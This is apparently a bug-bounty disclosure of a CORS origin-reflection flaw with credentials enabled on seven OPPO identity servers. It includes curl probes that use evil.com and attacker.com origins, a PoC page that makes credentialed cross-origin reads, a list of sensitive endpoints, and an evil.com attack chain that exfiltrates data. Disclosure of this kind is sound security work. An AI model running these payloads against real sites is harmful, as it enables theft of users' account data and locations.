# CORS Misconfiguration — Origin Reflection + Credentials on All 7 OPPO Identity Servers

> **Status:** Vulnerability reported and fixed. Published for educational purposes only.  
> All testing was conducted using researcher-owned accounts and curl/Playwright from controlled origins. No user data was accessed.

---

## Summary

All OPPO Identity servers across **7 IDC regions** reflect arbitrary `Origin` headers in `Access-Control-Allow-Origin` responses while simultaneously setting `Access-Control-Allow-Credentials: true`.

This allows any attacker-controlled website to make **authenticated cross-origin requests** to OPPO's identity API and read responses containing user account data — effectively enabling account takeover for any logged-in OPPO, realme, OnePlus, or HeyTap user who visits a malicious page.

**Severity:** High — CVSS 3.1: 8.1 (`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)  
**Affected users:** 500M+ active users across the OPPO ecosystem (OPPO, realme, OnePlus, HeyTap, ColorOS)

---

## Affected Servers

| Server | Region | URL |
|---|---|---|
| EU (France) | Europe | https://id-fr.oppo.com |
| SG | Global/Singapore | https://id-sg.oppo.com |
| IN | India | https://id-in.oppo.com |
| RU | Russia | https://id-ru.oppo.com |
| US | United States | https://id-us.oppo.com |
| CN | China | https://id-cn.oppo.com |
| HeyTap | HeyTap Global | https://id.heytap.com |

---

## Technical Details

### Root Cause

The CORS middleware on all 7 identity servers reflects any `Origin` header value without validation:

```bash
curl -s -D- -o /dev/null \
  -X OPTIONS \
  -H "Origin: https://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: content-type,x-envelope-version,x-biz-appkey,x-requesttime,x-sign,x-sign-key" \
  "https://id-fr.oppo.com/identity/web/v1/authn/auth"
```

Response headers:
```
access-control-allow-origin: https://evil.com      ← attacker origin reflected verbatim
access-control-allow-credentials: true              ← cookies sent cross-origin
access-control-allow-methods: POST,PUT,GET,OPTIONS,DELETE
```

The combination of **reflected origin + credentials: true** is the critical flaw. Each header alone would be acceptable — together they break the Same-Origin Policy entirely.

### All 7 Servers Confirmed

```bash
for host in id-fr.oppo.com id-sg.oppo.com id-in.oppo.com id-ru.oppo.com id-us.oppo.com id-cn.oppo.com id.heytap.com; do
  origin=$(curl -s -D- -o /dev/null -X OPTIONS \
    -H "Origin: https://attacker.com" \
    -H "Access-Control-Request-Method: POST" \
    "https://$host/identity/web/v1/authn/auth" 2>&1 | grep -i "access-control-allow-origin")
  echo "$host: $origin"
done
# All 7 servers reflect the attacker origin
```

### Why Session Cookies Are Sent Cross-Origin

OPPO's identity system implements cross-domain SSO across 27+ domains on different TLDs:

```
.oppo.com  .heytap.com  .realme.com  .oneplus.com  .oppo.cn
.oneplusbbs.com  .h2os.com  .heytapmobi.com  .coloros.com ...
```

The login success handler (`handle-login-success-1fbeba95.js`) uses `syncOldWebCookieUrls` with `withCredentials: true` to synchronize session cookies across these domains. For this to work across different TLDs, session cookies **must** be set with `SameSite=None; Secure` — a browser requirement.

This architectural decision makes the CORS misconfiguration especially dangerous: session cookies will always be sent on cross-origin requests, including from attacker-controlled domains.

### Sensitive Endpoints Accessible via CORS

Once session cookies are sent cross-origin, an attacker can call any authenticated API:

| Endpoint | Data Exposed |
|---|---|
| `/identity/web/v1/authn/auth` | Account info, login status |
| `/console/web/v1/getUserBaseInfo` | Full user profile |
| `/console/web/v4/getUserDevices` | All linked OPPO devices |
| `/albumpc/v1/photoList` | User's cloud photos |
| `/albumpc/v1/videoList` | User's cloud videos |
| `/albumpc/v4/download_file` | Download user files |
| `/find/web/v*/...` | Find My Phone — GPS location |

> Note: API requests require envelope encryption (AES-128-CTR + RSA-OAEP). The encryption keys and signing secrets are hardcoded in client-side JavaScript — an attacker can implement this in-browser via `crypto.subtle`.

---

## Proof of Concept

### Step 1 — Cross-Origin Read Confirmed via Playwright

```javascript
// Executed from http://localhost:8888
const resp = await fetch('https://id-fr.oppo.com/identity/web/v1/authn/auth', {
  method: 'POST',
  credentials: 'include',
  headers: { 'Content-Type': 'application/json' },
  body: '{}'
});
const data = await resp.text();
console.log(data);
// → {"code":233,"error":{"message":"format error"}}
// Response IS readable cross-origin — CORS allows it
```

The response is readable. For unauthenticated requests the server returns a `format error` (missing envelope encryption) — but the response itself is accessible, proving cross-origin reads work. For authenticated users, the same endpoint returns full account information.

### Step 2 — PoC HTML Page

```html
<!DOCTYPE html>
<html>
<head><title>OPPO CORS PoC</title></head>
<body>
<pre id="output">Loading...</pre>
<script>
async function exploit() {
  const output = document.getElementById('output');
  const targets = [
    'https://id-fr.oppo.com/identity/web/v1/authn/auth',
    'https://id-sg.oppo.com/identity/web/v1/authn/auth'
  ];

  let results = '';
  for (const url of targets) {
    try {
      const resp = await fetch(url, {
        method: 'POST',
        credentials: 'include',
        headers: { 'Content-Type': 'application/json' },
        body: '{}'
      });
      const text = await resp.text();
      results += `[${resp.status}] ${url}\nResponse: ${text.substring(0, 200)}\n\n`;
    } catch(e) {
      results += `[ERROR] ${url}: ${e.message}\n\n`;
    }
  }
  output.textContent = results;
}
exploit();
</script>
</body>
</html>
```

When opened in a browser where the user is logged into their OPPO account, this page makes cross-origin requests to OPPO identity servers and successfully reads the responses.

---

## Full Attack Chain

```
1. Attacker hosts a malicious page at https://evil.com/steal.html

2. Victim (logged into OPPO) visits the page — e.g. via phishing

3. Page sends:
   fetch('https://id-fr.oppo.com/identity/web/v1/authn/auth', {
     method: 'POST',
     credentials: 'include',
     ...
   })

4. Browser sends victim's SameSite=None session cookies with the request

5. CORS reflects 'https://evil.com' in Allow-Origin + credentials: true
   → browser allows JavaScript to read the response

6. Response contains victim's account ID, email, phone, linked devices

7. Attacker exfiltrates the data and can perform further authenticated actions
   (photos, video, GPS location via Find My Phone)
```

---

## Additional Finding — Internal Infrastructure Leak

Every API response leaks internal backend details:

```
X-Backend-Host: 0439:9002
X-Gateway-Host: 051fad6b6b5f22...
```

---

## Recommendations

1. **Whitelist allowed origins** — validate `Origin` against an explicit list before reflecting it
2. **Remove `Access-Control-Allow-Credentials: true`** for non-whitelisted origins
3. **Apply the fix to all 7 IDC servers simultaneously** — partial fixes leave the attack surface open

Secure configuration example:

```javascript
const allowedOrigins = [
  'https://id.oppo.com',
  'https://id-fr.oppo.com',
  'https://id-sg.oppo.com',
  // ... other legitimate OPPO domains
];

if (allowedOrigins.includes(request.headers.origin)) {
  response.setHeader('Access-Control-Allow-Origin', request.headers.origin);
  response.setHeader('Access-Control-Allow-Credentials', 'true');
}
// Do not set CORS headers for untrusted origins
```

---

## Timeline

| Date | Event |
|---|---|
| April 3, 2026 | Vulnerability discovered and tested across all 7 servers |
| April 3, 2026 | Report submitted to OPPO via HackerOne |
| April 6, 2026 | HackerOne triage team acknowledged the report |
| April 6, 2026 | Report marked as **duplicate** of #3646704 — *"CORS Origin Reflection on OPPO SSO/Identity Service"* — severity High (7–8.9) |

---

## Duplicate Notification

The HackerOne triage team confirmed the vulnerability was valid and classified as **High severity**, but had already been reported independently by another researcher a few days earlier.

> *"This CORS misconfiguration was previously reported and assessed in report #3646704. Both reports describe the same systematic CORS vulnerability affecting OPPO's identity infrastructure."*
> — HackerOne triage team

---

## Disclosure

- Testing performed from researcher-controlled origins (`http://localhost:8888`, curl)
- No user data was accessed or exfiltrated
- No authenticated requests were made against accounts other than the researcher's own
- Published after duplicate confirmation

---

## References

- [OWASP — CORS Misconfiguration](https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny)
- [PortSwigger — CORS vulnerabilities](https://portswigger.net/web-security/cors)
- [MDN — Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)
- [W3C CORS Spec — Credentialed Requests](https://www.w3.org/TR/cors/#resource-requests)
